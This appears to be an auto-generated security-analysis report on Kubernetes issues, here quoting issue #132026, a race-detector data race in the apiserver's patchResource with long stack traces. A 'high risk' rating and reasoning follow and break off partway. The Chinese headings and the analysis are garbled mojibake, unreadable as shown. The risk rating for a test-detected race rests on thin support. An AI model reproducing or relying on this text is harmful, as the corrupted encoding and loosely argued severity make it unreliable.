# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

> åˆ†ææ¨¡å‹ï¼šgemini-2.5-pro

# ğŸš¨ å­˜åœ¨é«˜é£é™©çš„ Issues (14 ä¸ª)

## Issue #132026 apiserver patchResource: DATA RACE

- Issue é“¾æ¥ï¼š[#132026](https://github.com/kubernetes/kubernetes/issues/132026)

### Issue å†…å®¹

#### What happened?

I have https://github.com/kubernetes/kubernetes/pull/116980 which runs integration tests with race detection enabled. Running it shows:
```
k8s.io/kubernetes/test/integration: servicecidr
...
=== RUN   TestServiceCIDRMigrationScenarios/IPv6,IPv4_->_IPv6,IPv4_(no_change)
...
WARNING: DATA RACE
Write at 0x00c008d1543f by goroutine 97562:
  k8s.io/apiserver/pkg/endpoints/handlers.(*patcher).patchResource.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:705 +0x204
  k8s.io/apiserver/pkg/endpoints/handlers.(*patcher).patchResource.func3()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:710 +0x43
  k8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:117 +0x102

Previous read at 0x00c008d1543f by goroutine 97561:
  k8s.io/apiserver/pkg/endpoints/handlers.(*patcher).patchResource()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:729 +0x1644
  k8s.io/apiserver/pkg/endpoints/handlers.PatchResource.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:247 +0x3c84
  k8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.restfulPatchResource.func12()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/installer.go:1330 +0x124
  k8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.InstrumentRouteFunc.func13()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:645 +0x2bc
  github.com/emicklei/go-restful/v3.(*Container).dispatch()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/emicklei/go-restful/v3/container.go:299 +0xfd5
  github.com/emicklei/go-restful/v3.(*Container).Dispatch()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/emicklei/go-restful/v3/container.go:204 +0x827
  k8s.io/apiserver/pkg/server.director.ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/handler.go:145 +0x7f9
  k8s.io/apiserver/pkg/server.(*director).ServeHTTP()
      <autogenerated>:1 +0x7b
  k8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/kube-aggregator/pkg/apiserver/handler_proxy.go:118 +0x307
  k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:251 +0x671
  k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:237 +0x5e
  k8s.io/apiserver/pkg/server.director.ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/handler.go:153 +0xa5e
  k8s.io/apiserver/pkg/server.(*director).ServeHTTP()
      <autogenerated>:1 +0x7b
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func22.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthorization.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authorization.go:84 +0x849
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func23.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle.func10()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:298 +0x13c
  k8s.io/apiserver/pkg/util/flowcontrol.(*configController).Handle.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/apf_filter.go:192 +0x3d6
  k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:391 +0x9a
  k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:392 +0x4a
  k8s.io/apiserver/pkg/util/flowcontrol.(*configController).Handle()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/apf_filter.go:179 +0xd05
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:304 +0x14c
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:305 +0x12d5
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle-fm()
      <autogenerated>:1 +0x51
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func24.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithImpersonation.func4()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/impersonation.go:50 +0x214
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func25.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.WithTracing.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/traces.go:57 +0x589
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.(*middleware).serveHTTP()
      /home/prow/go/src/k8s.io/kubernetes/vendor/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/handler.go:176 +0x1a77
  go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.NewMiddleware.func1.1()
      /home/prow/go/src/k8s.io/kubernetes/vendor/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/handler.go:65 +0x67
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xcdc
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x497
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11a
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3

Goroutine 97562 (running) created at:
  k8s.io/apiserver/pkg/endpoints/handlers/finisher.finishRequest()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:92 +0x13c
  k8s.io/apiserver/pkg/endpoints/handlers/finisher.FinishRequest()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/finisher/finisher.go:84 +0x161d
  k8s.io/apiserver/pkg/endpoints/handlers.(*patcher).patchResource()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:708 +0x14e9
  k8s.io/apiserver/pkg/endpoints/handlers.PatchResource.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/handlers/patch.go:247 +0x3c84
  k8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.restfulPatchResource.func12()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/installer.go:1330 +0x124
  k8s.io/apiserver/pkg/endpoints.(*APIInstaller).registerResourceHandlers.InstrumentRouteFunc.func13()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:645 +0x2bc
  github.com/emicklei/go-restful/v3.(*Container).dispatch()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/emicklei/go-restful/v3/container.go:299 +0xfd5
  github.com/emicklei/go-restful/v3.(*Container).Dispatch()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/emicklei/go-restful/v3/container.go:204 +0x827
  k8s.io/apiserver/pkg/server.director.ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/handler.go:145 +0x7f9
  k8s.io/apiserver/pkg/server.(*director).ServeHTTP()
      <autogenerated>:1 +0x7b
  k8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/kube-aggregator/pkg/apiserver/handler_proxy.go:118 +0x307
  k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:251 +0x671
  k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:237 +0x5e
  k8s.io/apiserver/pkg/server.director.ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/handler.go:153 +0xa5e
  k8s.io/apiserver/pkg/server.(*director).ServeHTTP()
      <autogenerated>:1 +0x7b
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func22.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthorization.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authorization.go:84 +0x849
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func23.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle.func10()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:298 +0x13c
  k8s.io/apiserver/pkg/util/flowcontrol.(*configController).Handle.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/apf_filter.go:192 +0x3d6
  k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:391 +0x9a
  k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset.(*request).Finish()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/fairqueuing/queueset/queueset.go:392 +0x4a
  k8s.io/apiserver/pkg/util/flowcontrol.(*configController).Handle()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/apf_filter.go:179 +0xd05
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:304 +0x14c
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/priority-and-fairness.go:305 +0x12d5
  k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle-fm()
      <autogenerated>:1 +0x51
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func24.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithImpersonation.func4()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/impersonation.go:50 +0x214
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func25.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x239
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.WithTracing.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/traces.go:57 +0x589
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.(*middleware).serveHTTP()
      /home/prow/go/src/k8s.io/kubernetes/vendor/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/handler.go:176 +0x1a77
  go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.NewMiddleware.func1.1()
      /home/prow/go/src/k8s.io/kubernetes/vendor/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/handler.go:65 +0x67
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:610 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xcdc
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x497
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11a
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3

Goroutine 97561 (running) created at:
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:101 +0x30a
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestDeadline.withRequestDeadline.func28()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/request_deadline.go:100 +0x24d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWaitGroup.withWaitGroup.func29()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/waitgroup.go:86 +0x1e9
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithCacheControl.func14()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/cachecontrol.go:31 +0xc5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithHTTPLogging.WithLogging.withLogging.func35()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/httplog/httplog.go:139 +0x2b5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithLatencyTrackers.func16()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/webhook_duration.go:56 +0x1cc
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestInfo.func18()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/requestinfo.go:39 +0x17a
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestReceivedTimestamp.withRequestReceivedTimestampWithClock.func32()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/request_received_time.go:38 +0xba
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithMuxAndDiscoveryComplete.func19()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/mux_discovery_complete.go:52 +0xc2
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithPanicRecovery.withPanicRecovery.func33()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/wrap.go:73 +0x1b9
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAuditInit.withAuditInit.func34()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit_init.go:63 +0x14b
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2294 +0x47
  k8s.io/apiserver/pkg/server.(*APIServerHandler).ServeHTTP()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/handler.go:188 +0x5b
  net/http.serverHandler.ServeHTTP()
      /usr/local/go/src/net/http/server.go:3301 +0x2a1
  net/http.initALPNRequest.ServeHTTP()
      /usr/local/go/src/net/http/server.go:3974 +0x358
  net/http.(*initALPNRequest).ServeHTTP()
      <autogenerated>:1 +0x7b
  net/http.Handler.ServeHTTP-fm()
      <autogenerated>:1 +0x67
  golang.org/x/net/http2.(*serverConn).runHandler()
      /home/prow/go/src/k8s.io/kubernetes/vendor/golang.org/x/net/http2/server.go:2433 +0x253
  golang.org/x/net/http2.(*serverConn).scheduleHandler.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/vendor/golang.org/x/net/http2/server.go:2367 +0x5d
```

#### What did you expect to happen?

No data race.

#### How can we reproduce it (as minimally and precisely as possible)?

Run locally with `go test -race`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

master

/sig api-machinery


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨Kubernetes APIæœåŠ¡å™¨çš„`patchResource`å‡½æ•°ä¸­æ£€æµ‹åˆ°çš„æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰é—®é¢˜ã€‚è¯¥é—®é¢˜æ˜¯åœ¨å¯ç”¨Goè¯­è¨€çš„ç«äº‰æ£€æµ‹å™¨ï¼ˆ`-race`æ ‡å¿—ï¼‰è¿›è¡Œé›†æˆæµ‹è¯•æ—¶å‘ç°çš„ã€‚

æ ¹æ®å †æ ˆè·Ÿè¸ªä¿¡æ¯ï¼Œé—®é¢˜å‘ç”Ÿåœ¨å¤„ç†HTTP PATCHè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼š
1.  **å†™æ“ä½œ**ï¼šå‘ç”Ÿåœ¨`patchResource.func2`å’Œ`patchResource.func3`è¿™ä¸¤ä¸ªgoroutineä¸­ã€‚ä»å‡½æ•°åå’Œä»£ç ä½ç½®æ¥çœ‹ï¼Œè¿™å¾ˆå¯èƒ½æ˜¯`defer`è¯­å¥ä¸­ç”¨äºæ¸…ç†æˆ–å®Œæˆè¯·æ±‚çš„å‡½æ•°ã€‚
2.  **è¯»æ“ä½œ**ï¼šå‘ç”Ÿåœ¨ä¸»goroutineçš„`patchResource`å‡½æ•°ä¸­ã€‚

æ•°æ®ç«äº‰æ„å‘³ç€å¤šä¸ªgoroutineåœ¨æ²¡æœ‰é€‚å½“åŒæ­¥ï¼ˆå¦‚ä½¿ç”¨äº’æ–¥é”ï¼‰çš„æƒ…å†µä¸‹å¹¶å‘åœ°è¯»å†™åŒä¸€ä¸ªå†…å­˜åœ°å€ã€‚è¿™ç§è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ï¼Œå¯èƒ½å¯¼è‡´å¤šç§ä¸¥é‡åæœï¼š
1.  **ç¨‹åºå´©æºƒï¼ˆPanicï¼‰**ï¼šæ•°æ®ç«äº‰å¯èƒ½å¯¼è‡´å†…å­˜æŸåï¼Œä»è€Œå¼•å‘Goè¿è¡Œæ—¶ææ…Œï¼Œå¯¼è‡´APIæœåŠ¡å™¨è¿›ç¨‹å´©æºƒã€‚
